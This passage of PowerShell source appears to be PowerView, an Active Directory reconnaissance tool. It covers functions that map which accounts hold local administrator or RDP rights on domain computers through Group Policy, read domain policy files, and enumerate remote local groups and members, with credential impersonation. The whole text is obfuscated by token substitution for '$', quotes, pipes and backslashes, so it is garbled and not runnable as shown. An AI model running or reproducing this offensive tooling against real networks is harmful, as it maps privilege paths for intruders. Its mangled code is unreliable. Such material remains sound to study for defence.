                    RaUGPOLocalGroupMapping wZ5t Add-Member Noteproperty q4gUGPODisplayNameq4gU RaUGPOname
                    RaUGPOLocalGroupMapping wZ5t Add-Member Noteproperty q4gUGPOGuidq4gU RaUGPOGuid
                    RaUGPOLocalGroupMapping wZ5t Add-Member Noteproperty q4gUGPOPathq4gU RaUGPOPath
                    RaUGPOLocalGroupMapping wZ5t Add-Member Noteproperty q4gUGPOTypeq4gU RaUGPOType
                    RaUGPOLocalGroupMapping wZ5t Add-Member Noteproperty q4gUContainerNameq4gU RaU_.distinguishedname
                    RaUGPOLocalGroupMapping wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaU_.siteobjectbl
                    RaUGPOLocalGroupMapping.PSObject.TypeNames.Add(q4gUPowerView.GPOLocalGroupMappingq4gU)
                    RaUGPOLocalGroupMapping
                }
            }
        }
    }
}


function Get-DomainGPOComputerLocalGroupMapping {
<#
.SYNOPSIS

Takes a computer (or GPO) object and determines what users/groups are in the specified
local group for the machine through GPO correlation.

Author: @harmj0y  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Get-DomainOU, Get-NetComputerSiteName, Get-DomainSite, Get-DomainGPOLocalGroup  

.DESCRIPTION

This function is the inverse of Get-DomainGPOUserLocalGroupMapping, and finds what users/groups
are in the specified local group for a target machine through GPO correlation.

If a -ComputerIdentity is specified, retrieve the complete computer object, attempt to
determine the OU the computer is a part of. Then resolve the computerq4gUs site name with
Get-NetComputerSiteName and retrieve all sites object Get-DomainSite. For those results, attempt to
enumerate all linked GPOs and associated local group settings with Get-DomainGPOLocalGroup. For
each resulting GPO group, resolve the resulting user/group name to a full AD object and
return the results. This will return the domain objects that are members of the specified
-LocalGroup for the given computer.

Otherwise, if -OUIdentity is supplied, the same process is executed to find linked GPOs and
localgroup specifications.

.PARAMETER ComputerIdentity

A SamAccountName (e.g. WINDOWS10RaU), DistinguishedName (e.g. CN=WINDOWS10,CN=Computers,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1124), GUID (e.g. 4f16b6bc-7010-4cbf-b628-f3cfe20f6994),
or a dns host name (e.g. windows10.testlab.local) for the computer to identity GPO local group mappings for.

.PARAMETER OUIdentity

An OU name (e.g. TestOU), DistinguishedName (e.g. OU=TestOU,DC=testlab,DC=local), or
GUID (e.g. 8a9ba22a-8977-47e6-84ce-8c26af4e1e6a) for the OU to identity GPO local group mappings for.

.PARAMETER LocalGroup

The local group to check access against.
Can be Oj8XAdministratorsOj8X (S-1-5-32-544), Oj8XRDP/Remote Desktop UsersOj8X (S-1-5-32-555),
or a custom local SID. Defaults to local q4gUAdministratorsq4gU.

.PARAMETER Domain

Specifies the domain to enumerate GPOs for, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGPOComputerLocalGroupMapping -ComputerName WINDOWS3.testlab.local

Finds users who have local admin rights over WINDOWS3 through GPO correlation.

.EXAMPLE

Get-DomainGPOComputerLocalGroupMapping -Domain dev.testlab.local -ComputerName WINDOWS4.dev.testlab.local -LocalGroup RDP

Finds users who have RDP rights over WINDOWS4 through GPO correlation.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainGPOComputerLocalGroupMapping -Credential RaUCred -ComputerIdentity SQL.testlab.local

.OUTPUTS

PowerView.GGPOComputerLocalGroupMember
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.GGPOComputerLocalGroupMemberq4gU)]
    [CmdletBinding(DefaultParameterSetName = q4gUComputerIdentityq4gU)]
    Param(
        [Parameter(Position = 0, ParameterSetName = q4gUComputerIdentityq4gU, Mandatory = RaUTrue, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUComputerNameq4gU, q4gUComputerq4gU, q4gUDistinguishedNameq4gU, q4gUSamAccountNameq4gU, q4gUNameq4gU)]
        [String]
        RaUComputerIdentity,

        [Parameter(Mandatory = RaUTrue, ParameterSetName = q4gUOUIdentityq4gU)]
        [Alias(q4gUOUq4gU)]
        [String]
        RaUOUIdentity,

        [String]
        [ValidateSet(q4gUAdministratorsq4gU, q4gUS-1-5-32-544q4gU, q4gURDPq4gU, q4gURemote Desktop Usersq4gU, q4gUS-1-5-32-555q4gU)]
        RaULocalGroup = q4gUAdministratorsq4gU,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUCommonArguments = @{}
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUCommonArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUCommonArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUCommonArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUCommonArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUCommonArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUCommonArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUCommonArguments[q4gUCredentialq4gU] = RaUCredential }
    }

    PROCESS {
        if (RaUPSBoundParameters[q4gUComputerIdentityq4gU]) {
            RaUComputers = Get-DomainComputer @CommonArguments -Identity RaUComputerIdentity -Properties q4gUdistinguishedname,dnshostnameq4gU

            if (-not RaUComputers) {
                throw Oj8X[Get-DomainGPOComputerLocalGroupMapping] Computer RaUComputerIdentity not found. Try a fully qualified host name.Oj8X
            }

            ForEach (RaUComputer in RaUComputers) {

                RaUGPOGuids = @()

                # extract any GPOs linked to this computerq4gUs OU through gpLink
                RaUDN = RaUComputer.distinguishedname
                RaUOUIndex = RaUDN.IndexOf(q4gUOU=q4gU)
                if (RaUOUIndex -gt 0) {
                    RaUOUName = RaUDN.SubString(RaUOUIndex)
                }
                if (RaUOUName) {
                    RaUGPOGuids += Get-DomainOU @CommonArguments -SearchBase RaUOUName -LDAPFilter q4gU(gplink=*)q4gU wZ5t ForEach-Object {
                        Select-String -InputObject RaU_.gplink -Pattern q4gU(ScKj{){0,1}[0-9a-fA-F]{8}ScKj-[0-9a-fA-F]{4}ScKj-[0-9a-fA-F]{4}ScKj-[0-9a-fA-F]{4}ScKj-[0-9a-fA-F]{12}(ScKj}){0,1}q4gU -AllMatches wZ5t ForEach-Object {RaU_.Matches wZ5t Select-Object -ExpandProperty Value }
                    }
                }

                # extract any GPOs linked to this computerq4gUs site through gpLink
                Write-Verbose Oj8XEnumerating the sitename for: RaU(RaUComputer.dnshostname)Oj8X
                RaUComputerSite = (Get-NetComputerSiteName -ComputerName RaUComputer.dnshostname).SiteName
                if (RaUComputerSite -and (RaUComputerSite -notmatch q4gUErrorq4gU)) {
                    RaUGPOGuids += Get-DomainSite @CommonArguments -Identity RaUComputerSite -LDAPFilter q4gU(gplink=*)q4gU wZ5t ForEach-Object {
                        Select-String -InputObject RaU_.gplink -Pattern q4gU(ScKj{){0,1}[0-9a-fA-F]{8}ScKj-[0-9a-fA-F]{4}ScKj-[0-9a-fA-F]{4}ScKj-[0-9a-fA-F]{4}ScKj-[0-9a-fA-F]{12}(ScKj}){0,1}q4gU -AllMatches wZ5t ForEach-Object {RaU_.Matches wZ5t Select-Object -ExpandProperty Value }
                    }
                }

                # process any GPO local group settings from the GPO GUID set
                RaUGPOGuids wZ5t Get-DomainGPOLocalGroup @CommonArguments wZ5t Sort-Object -Property GPOName -Unique wZ5t ForEach-Object {
                    RaUGPOGroup = RaU_

                    if(RaUGPOGroup.GroupMembers) {
                        RaUGPOMembers = RaUGPOGroup.GroupMembers
                    }
                    else {
                        RaUGPOMembers = RaUGPOGroup.GroupSID
                    }

                    RaUGPOMembers wZ5t ForEach-Object {
                        RaUObject = Get-DomainObject @CommonArguments -Identity RaU_
                        RaUIsGroup = @(q4gU268435456q4gU,q4gU268435457q4gU,q4gU536870912q4gU,q4gU536870913q4gU) -contains RaUObject.samaccounttype

                        RaUGPOComputerLocalGroupMember = New-Object PSObject
                        RaUGPOComputerLocalGroupMember wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaUComputer.dnshostname
                        RaUGPOComputerLocalGroupMember wZ5t Add-Member Noteproperty q4gUObjectNameq4gU RaUObject.samaccountname
                        RaUGPOComputerLocalGroupMember wZ5t Add-Member Noteproperty q4gUObjectDNq4gU RaUObject.distinguishedname
                        RaUGPOComputerLocalGroupMember wZ5t Add-Member Noteproperty q4gUObjectSIDq4gU RaU_
                        RaUGPOComputerLocalGroupMember wZ5t Add-Member Noteproperty q4gUIsGroupq4gU RaUIsGroup
                        RaUGPOComputerLocalGroupMember wZ5t Add-Member Noteproperty q4gUGPODisplayNameq4gU RaUGPOGroup.GPODisplayName
                        RaUGPOComputerLocalGroupMember wZ5t Add-Member Noteproperty q4gUGPOGuidq4gU RaUGPOGroup.GPOName
                        RaUGPOComputerLocalGroupMember wZ5t Add-Member Noteproperty q4gUGPOPathq4gU RaUGPOGroup.GPOPath
                        RaUGPOComputerLocalGroupMember wZ5t Add-Member Noteproperty q4gUGPOTypeq4gU RaUGPOGroup.GPOType
                        RaUGPOComputerLocalGroupMember.PSObject.TypeNames.Add(q4gUPowerView.GPOComputerLocalGroupMemberq4gU)
                        RaUGPOComputerLocalGroupMember
                    }
                }
            }
        }
    }
}


function Get-DomainPolicyData {
<#
.SYNOPSIS

Returns the default domain policy or the domain controller policy for the current
domain or a specified domain/domain controller.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainGPO, Get-GptTmpl, ConvertFrom-SID  

.DESCRIPTION

Returns the default domain policy or the domain controller policy for the current
domain or a specified domain/domain controller using Get-DomainGPO.

.PARAMETER Domain

The domain to query for default policies, defaults to the current domain.

.PARAMETER Policy

Extract q4gUDomainq4gU, q4gUDCq4gU (domain controller) policies, or q4gUAllq4gU for all policies.
Otherwise queries for the particular GPO name or GUID.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainPolicyData

Returns the default domain policy for the current domain.

.EXAMPLE

Get-DomainPolicyData -Domain dev.testlab.local

Returns the default domain policy for the dev.testlab.local domain.

.EXAMPLE

Get-DomainGPO wZ5t Get-DomainPolicy

Parses any GptTmpl.infs found for any policies in the current domain.

.EXAMPLE

Get-DomainPolicyData -Policy DC -Domain dev.testlab.local

Returns the policy for the dev.testlab.local domain controller.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainPolicyData -Credential RaUCred

.OUTPUTS

Hashtable

Ouputs a hashtable representing the parsed GptTmpl.inf file.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUSourceq4gU, q4gUNameq4gU)]
        [String]
        RaUPolicy = q4gUDomainq4gU,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUSearcherArguments = @{}
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }

        RaUConvertArguments = @{}
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUConvertArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUConvertArguments[q4gUCredentialq4gU] = RaUCredential }
    }

    PROCESS {
        if (RaUPSBoundParameters[q4gUDomainq4gU]) {
            RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain
            RaUConvertArguments[q4gUDomainq4gU] = RaUDomain
        }

        if (RaUPolicy -eq q4gUAllq4gU) {
            RaUSearcherArguments[q4gUIdentityq4gU] = q4gU*q4gU
        }
        elseif (RaUPolicy -eq q4gUDomainq4gU) {
            RaUSearcherArguments[q4gUIdentityq4gU] = q4gU{31B2F340-016D-11D2-945F-00C04FB984F9}q4gU
        }
        elseif ((RaUPolicy -eq q4gUDomainControllerq4gU) -or (RaUPolicy -eq q4gUDCq4gU)) {
            RaUSearcherArguments[q4gUIdentityq4gU] = q4gU{6AC1786C-016F-11D2-945F-00C04FB984F9}q4gU
        }
        else {
            RaUSearcherArguments[q4gUIdentityq4gU] = RaUPolicy
        }

        RaUGPOResults = Get-DomainGPO @SearcherArguments

        ForEach (RaUGPO in RaUGPOResults) {
            # grab the GptTmpl.inf file and parse it
            RaUGptTmplPath = RaUGPO.gpcfilesyspath + Oj8XScKjMACHINEScKjMicrosoftScKjWindows NTScKjSecEditScKjGptTmpl.infOj8X

            RaUParseArgs =  @{
                q4gUGptTmplPathq4gU = RaUGptTmplPath
                q4gUOutputObjectq4gU = RaUTrue
            }
            if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUParseArgs[q4gUCredentialq4gU] = RaUCredential }

            # parse the GptTmpl.inf
            Get-GptTmpl @ParseArgs wZ5t ForEach-Object {
                RaU_ wZ5t Add-Member Noteproperty q4gUGPONameq4gU RaUGPO.name
                RaU_ wZ5t Add-Member Noteproperty q4gUGPODisplayNameq4gU RaUGPO.displayname
                RaU_
            }
        }
    }
}


########################################################
#
# Functions that enumerate a single host, either through
# WinNT, WMI, remote registry, or API calls
# (with PSReflect).
#
########################################################

function Get-NetLocalGroup {
<#
.SYNOPSIS

Enumerates the local groups on the local (or remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function will enumerate the names and descriptions for the
local groups on the current, or remote, machine. By default, the Win32 API
call NetLocalGroupEnum will be used (for speed). Specifying Oj8X-Method WinNTOj8X
causes the WinNT service provider to be used instead, which returns group
SIDs along with the group names and descriptions/comments.

.PARAMETER ComputerName

Specifies the hostname to query for sessions (also accepts IP addresses).
Defaults to the localhost.

.PARAMETER Method

The collection method to use, defaults to q4gUAPIq4gU, also accepts q4gUWinNTq4gU.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to a remote machine. Only applicable with Oj8X-Method WinNTOj8X.

.EXAMPLE

Get-NetLocalGroup

ComputerName                  GroupName                     Comment
------------                  ---------                     -------
WINDOWS1                      Administrators                Administrators have comple...
WINDOWS1                      Backup Operators              Backup Operators can overr...
WINDOWS1                      Cryptographic Operators       Members are authorized to ...
...

.EXAMPLE

Get-NetLocalGroup -Method Winnt

ComputerName           GroupName              GroupSID              Comment
------------           ---------              --------              -------
WINDOWS1               Administrators         S-1-5-32-544          Administrators hav...
WINDOWS1               Backup Operators       S-1-5-32-551          Backup Operators c...
WINDOWS1               Cryptographic Opera... S-1-5-32-569          Members are author...
...

.EXAMPLE

Get-NetLocalGroup -ComputerName primary.testlab.local

ComputerName                  GroupName                     Comment
------------                  ---------                     -------
primary.testlab.local         Administrators                Administrators have comple...
primary.testlab.local         Users                         Users are prevented from m...
primary.testlab.local         Guests                        Guests have the same acces...
primary.testlab.local         Print Operators               Members can administer dom...
primary.testlab.local         Backup Operators              Backup Operators can overr...

.OUTPUTS

PowerView.LocalGroup.API

Custom PSObject with translated group property fields from API results.

PowerView.LocalGroup.WinNT

Custom PSObject with translated group property fields from WinNT results.

.LINK

https://msdn.microsoft.com/en-us/library/windows/desktop/aa370440(v=vs.85).aspx
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.LocalGroup.APIq4gU)]
    [OutputType(q4gUPowerView.LocalGroup.WinNTq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUHostNameq4gU, q4gUdnshostnameq4gU, q4gUnameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUComputerName = RaUEnv:COMPUTERNAME,

        [ValidateSet(q4gUAPIq4gU, q4gUWinNTq4gU)]
        [Alias(q4gUCollectionMethodq4gU)]
        [String]
        RaUMethod = q4gUAPIq4gU,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
            RaULogonToken = Invoke-UserImpersonation -Credential RaUCredential
        }
    }

    PROCESS {
        ForEach (RaUComputer in RaUComputerName) {
            if (RaUMethod -eq q4gUAPIq4gU) {
                # if weq4gUre using the Netapi32 NetLocalGroupEnum API call to get the local group information

                # arguments for NetLocalGroupEnum
                RaUQueryLevel = 1
                RaUPtrInfo = [IntPtr]::Zero
                RaUEntriesRead = 0
                RaUTotalRead = 0
                RaUResumeHandle = 0

                # get the local user information
                RaUResult = RaUNetapi32::NetLocalGroupEnum(RaUComputer, RaUQueryLevel, [ref]RaUPtrInfo, -1, [ref]RaUEntriesRead, [ref]RaUTotalRead, [ref]RaUResumeHandle)

                # locate the offset of the initial intPtr
                RaUOffset = RaUPtrInfo.ToInt64()

                # 0 = success
                if ((RaUResult -eq 0) -and (RaUOffset -gt 0)) {

                    # Work out how much to increment the pointer by finding out the size of the structure
                    RaUIncrement = RaULOCALGROUP_INFO_1::GetSize()

                    # parse all the result structures
                    for (RaUi = 0; (RaUi -lt RaUEntriesRead); RaUi++) {
                        # create a new int ptr at the given offset and cast the pointer as our result structure
                        RaUNewIntPtr = New-Object System.Intptr -ArgumentList RaUOffset
                        RaUInfo = RaUNewIntPtr -as RaULOCALGROUP_INFO_1

                        RaUOffset = RaUNewIntPtr.ToInt64()
                        RaUOffset += RaUIncrement

                        RaULocalGroup = New-Object PSObject
                        RaULocalGroup wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaUComputer
                        RaULocalGroup wZ5t Add-Member Noteproperty q4gUGroupNameq4gU RaUInfo.lgrpi1_name
                        RaULocalGroup wZ5t Add-Member Noteproperty q4gUCommentq4gU RaUInfo.lgrpi1_comment
                        RaULocalGroup.PSObject.TypeNames.Insert(0, q4gUPowerView.LocalGroup.APIq4gU)
                        RaULocalGroup
                    }
                    # free up the result buffer
                    RaUNull = RaUNetapi32::NetApiBufferFree(RaUPtrInfo)
                }
                else {
                    Write-Verbose Oj8X[Get-NetLocalGroup] Error: RaU(([ComponentModel.Win32Exception] RaUResult).Message)Oj8X
                }
            }
            else {
                # otherwise weq4gUre using the WinNT service provider
                RaUComputerProvider = [ADSI]Oj8XWinNT://RaUComputer,computerOj8X

                RaUComputerProvider.psbase.children wZ5t Where-Object { RaU_.psbase.schemaClassName -eq q4gUgroupq4gU } wZ5t ForEach-Object {
                    RaULocalGroup = ([ADSI]RaU_)
                    RaUGroup = New-Object PSObject
                    RaUGroup wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaUComputer
                    RaUGroup wZ5t Add-Member Noteproperty q4gUGroupNameq4gU (RaULocalGroup.InvokeGet(q4gUNameq4gU))
                    RaUGroup wZ5t Add-Member Noteproperty q4gUSIDq4gU ((New-Object System.Security.Principal.SecurityIdentifier(RaULocalGroup.InvokeGet(q4gUobjectsidq4gU),0)).Value)
                    RaUGroup wZ5t Add-Member Noteproperty q4gUCommentq4gU (RaULocalGroup.InvokeGet(q4gUDescriptionq4gU))
                    RaUGroup.PSObject.TypeNames.Insert(0, q4gUPowerView.LocalGroup.WinNTq4gU)
                    RaUGroup
                }
            }
        }
    }
    
    END {
        if (RaULogonToken) {
            Invoke-RevertToSelf -TokenHandle RaULogonToken
        }
    }
}


function Get-NetLocalGroupMember {
<#
.SYNOPSIS

Enumerates members of a specific local group on the local (or remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Convert-ADName  

.DESCRIPTION

This function will enumerate the members of a specified local group  on the
current, or remote, machine. By default, the Win32 API call NetLocalGroupGetMembers
will be used (for speed). Specifying Oj8X-Method WinNTOj8X causes the WinNT service provider
to be used instead, which returns a larger amount of information.

.PARAMETER ComputerName

Specifies the hostname to query for sessions (also accepts IP addresses).
Defaults to the localhost.

.PARAMETER GroupName

The local group name to query for users. If not given, it defaults to Oj8XAdministratorsOj8X.

.PARAMETER Method

The collection method to use, defaults to q4gUAPIq4gU, also accepts q4gUWinNTq4gU.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to a remote machine. Only applicable with Oj8X-Method WinNTOj8X.

.EXAMPLE

Get-NetLocalGroupMember wZ5t ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
WINDOWS1       Administrators WINDOWS1ScKjAd... S-1-5-21-25...          False          False
WINDOWS1       Administrators WINDOWS1ScKjlo... S-1-5-21-25...          False          False
WINDOWS1       Administrators TESTLABScKjDom... S-1-5-21-89...           True           True
WINDOWS1       Administrators TESTLABScKjhar... S-1-5-21-89...          False           True

.EXAMPLE

Get-NetLocalGroupMember -Method winnt wZ5t ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
WINDOWS1       Administrators WINDOWS1ScKjAd... S-1-5-21-25...          False          False
WINDOWS1       Administrators WINDOWS1ScKjlo... S-1-5-21-25...          False          False
WINDOWS1       Administrators TESTLABScKjDom... S-1-5-21-89...           True           True
WINDOWS1       Administrators TESTLABScKjhar... S-1-5-21-89...          False           True

.EXAMPLE

Get-NetLocalGroup wZ5t Get-NetLocalGroupMember wZ5t ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
WINDOWS1       Administrators WINDOWS1ScKjAd... S-1-5-21-25...          False          False
WINDOWS1       Administrators WINDOWS1ScKjlo... S-1-5-21-25...          False          False
WINDOWS1       Administrators TESTLABScKjDom... S-1-5-21-89...           True           True
WINDOWS1       Administrators TESTLABScKjhar... S-1-5-21-89...          False           True
WINDOWS1       Guests         WINDOWS1ScKjGuest S-1-5-21-25...          False          False
WINDOWS1       IIS_IUSRS      NT AUTHORIT... S-1-5-17                False          False
WINDOWS1       Users          NT AUTHORIT... S-1-5-4                 False          False
WINDOWS1       Users          NT AUTHORIT... S-1-5-11                False          False
WINDOWS1       Users          WINDOWS1ScKjlo... S-1-5-21-25...          False        UNKNOWN
WINDOWS1       Users          TESTLABScKjDom... S-1-5-21-89...           True        UNKNOWN

.EXAMPLE

Get-NetLocalGroupMember -ComputerName primary.testlab.local wZ5t ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
primary.tes... Administrators TESTLABScKjAdm... S-1-5-21-89...          False          False
primary.tes... Administrators TESTLABScKjloc... S-1-5-21-89...          False          False
primary.tes... Administrators TESTLABScKjEnt... S-1-5-21-89...           True          False
primary.tes... Administrators TESTLABScKjDom... S-1-5-21-89...           True          False

.OUTPUTS

PowerView.LocalGroupMember.API

Custom PSObject with translated group property fields from API results.

PowerView.LocalGroupMember.WinNT

Custom PSObject with translated group property fields from WinNT results.

.LINK

http://stackoverflow.com/questions/21288220/get-all-local-members-and-groups-displayed-together
http://msdn.microsoft.com/en-us/library/aa772211(VS.85).aspx
https://msdn.microsoft.com/en-us/library/windows/desktop/aa370601(v=vs.85).aspx
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.LocalGroupMember.APIq4gU)]
    [OutputType(q4gUPowerView.LocalGroupMember.WinNTq4gU)]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUHostNameq4gU, q4gUdnshostnameq4gU, q4gUnameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUComputerName = RaUEnv:COMPUTERNAME,

        [Parameter(ValueFromPipelineByPropertyName = RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUGroupName = q4gUAdministratorsq4gU,

        [ValidateSet(q4gUAPIq4gU, q4gUWinNTq4gU)]
        [Alias(q4gUCollectionMethodq4gU)]
        [String]
        RaUMethod = q4gUAPIq4gU,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
            RaULogonToken = Invoke-UserImpersonation -Credential RaUCredential
        }
    }

    PROCESS {
        ForEach (RaUComputer in RaUComputerName) {
            if (RaUMethod -eq q4gUAPIq4gU) {
                # if weq4gUre using the Netapi32 NetLocalGroupGetMembers API call to get the local group information

                # arguments for NetLocalGroupGetMembers
                RaUQueryLevel = 2
                RaUPtrInfo = [IntPtr]::Zero
                RaUEntriesRead = 0
                RaUTotalRead = 0
                RaUResumeHandle = 0

                # get the local user information
                RaUResult = RaUNetapi32::NetLocalGroupGetMembers(RaUComputer, RaUGroupName, RaUQueryLevel, [ref]RaUPtrInfo, -1, [ref]RaUEntriesRead, [ref]RaUTotalRead, [ref]RaUResumeHandle)

                # locate the offset of the initial intPtr
                RaUOffset = RaUPtrInfo.ToInt64()

                RaUMembers = @()

                # 0 = success
                if ((RaUResult -eq 0) -and (RaUOffset -gt 0)) {

                    # Work out how much to increment the pointer by finding out the size of the structure
                    RaUIncrement = RaULOCALGROUP_MEMBERS_INFO_2::GetSize()

                    # parse all the result structures
                    for (RaUi = 0; (RaUi -lt RaUEntriesRead); RaUi++) {
                        # create a new int ptr at the given offset and cast the pointer as our result structure
                        RaUNewIntPtr = New-Object System.Intptr -ArgumentList RaUOffset
                        RaUInfo = RaUNewIntPtr -as RaULOCALGROUP_MEMBERS_INFO_2

                        RaUOffset = RaUNewIntPtr.ToInt64()
                        RaUOffset += RaUIncrement

                        RaUSidString = q4gUq4gU
                        RaUResult2 = RaUAdvapi32::ConvertSidToStringSid(RaUInfo.lgrmi2_sid, [ref]RaUSidString);RaULastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if (RaUResult2 -eq 0) {
                            Write-Verbose Oj8X[Get-NetLocalGroupMember] Error: RaU(([ComponentModel.Win32Exception] RaULastError).Message)Oj8X
                        }
                        else {
                            RaUMember = New-Object PSObject
                            RaUMember wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaUComputer
                            RaUMember wZ5t Add-Member Noteproperty q4gUGroupNameq4gU RaUGroupName
                            RaUMember wZ5t Add-Member Noteproperty q4gUMemberNameq4gU RaUInfo.lgrmi2_domainandname
                            RaUMember wZ5t Add-Member Noteproperty q4gUSIDq4gU RaUSidString
                            RaUIsGroup = RaU(RaUInfo.lgrmi2_sidusage -eq q4gUSidTypeGroupq4gU)
                            RaUMember wZ5t Add-Member Noteproperty q4gUIsGroupq4gU RaUIsGroup
                            RaUMember.PSObject.TypeNames.Insert(0, q4gUPowerView.LocalGroupMember.APIq4gU)
                            RaUMembers += RaUMember
                        }
                    }

                    # free up the result buffer
                    RaUNull = RaUNetapi32::NetApiBufferFree(RaUPtrInfo)

                    # try to extract out the machine SID by using the -500 account as a reference
